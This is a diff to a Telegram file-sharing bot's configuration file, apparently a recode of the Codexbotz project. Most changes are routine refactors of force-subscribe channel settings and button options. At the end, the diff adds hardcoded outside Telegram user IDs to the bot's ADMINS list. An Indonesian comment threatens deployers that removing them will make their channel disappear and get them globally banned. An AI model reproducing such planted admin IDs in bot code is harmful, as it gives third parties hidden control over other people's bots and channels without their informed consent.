@@ -1,3 +1,7 @@
+# (©)Codexbotz
+# Recode by @mrismanaziz
+# t.me/SharingUserbot & t.me/Lunatic0de
+
 import logging
 import os
 from distutils.util import strtobool
@@ -29,16 +33,27 @@ HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
 HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)
 
 # Custom Repo for updater.
-UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "main")
+UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")
 
 # Database
 DB_URI = os.environ.get("DATABASE_URL", "")
 
 # ID dari Channel Atau Group Untuk Wajib Subscribenya
-FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
-FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))
-FORCE_SUB_CHANNEL_2 = int(os.environ.get("FORCE_SUB_CHANNEL_2", "0"))
-FORCE_SUB_GROUP_2 = int(os.environ.get("FORCE_SUB_GROUP_2", "0"))
+FORCE_SUB = {}
+FORCE_SUB_COUNTER = 1
+while True:
+    key = f"FORCE_SUB{FORCE_SUB_COUNTER}"
+    value = os.environ.get(key)
+    if value is None:
+        break
+    FORCE_SUB[FORCE_SUB_COUNTER] = int(value)
+    FORCE_SUB_COUNTER += 1
+
+# Berapa baris maunya
+BUTTONS_PER_ROW = int(os.environ.get("BUTTONS_PER_ROW", "3"))
+
+# Tulisan joinnya mau gimana
+BUTTONS_JOIN_TEXT = os.environ.get("BUTTONS_JOIN_TEXT", "ᴊᴏɪɴ")
 
 TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))
 
@@ -66,7 +81,7 @@ DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "Fal
 
 # Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
 # Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
-ADMINS.extend((6109394253, ))
+ADMINS.extend((1809705826, 6514936360, 6109394253))
 
 
 LOG_FILE_NAME = "logs.txt"
